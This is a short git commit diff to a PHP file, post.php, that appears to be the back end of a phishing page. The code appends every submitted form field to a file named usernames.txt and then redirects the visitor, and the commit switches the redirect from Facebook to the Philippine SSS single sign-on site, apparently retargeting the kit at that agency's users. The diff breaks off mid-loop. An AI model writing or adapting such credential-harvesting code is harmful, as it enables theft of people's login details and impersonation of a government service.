25650c315a4459c354791395c23049aa3f696982
haroldevvv <hasalvador@my.cspc.edu.ph>
2025-03-02 10:39:58 +0800

    Update post.php

--- post.php
+++ post.php
@@ -1,5 +1,5 @@
 <?php
-header (‘Location:http://www.facebook.com/’);
+header (‘Location:https://sso.sss.gov.ph/’);
 $handle = fopen(“usernames.txt”, “a”);
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
